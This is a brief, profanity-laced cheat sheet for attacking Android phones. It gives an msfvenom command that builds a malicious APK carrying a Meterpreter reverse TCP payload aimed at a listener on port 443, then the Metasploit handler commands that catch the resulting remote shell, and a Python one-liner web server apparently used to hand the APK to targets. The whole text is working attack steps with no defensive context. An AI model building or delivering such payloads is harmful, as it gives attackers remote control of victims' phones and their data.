# Android Hackfuckin
## Meterpreter
`msfvenom --payload android/meterpreter_reverse_tcp LHOST=10.0.0.51 LPORT=443 R > rawdoggin_output.apk`

## Msfconsole
```
sudo msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter_reverse_tcp
msf exploit(handler) > set lhost 10.0.0.51
msf exploit(handler) > set lport 443
msf exploit(handler) > exploit -j
```

## Python Shitfuckery
`python -m http.server 8787`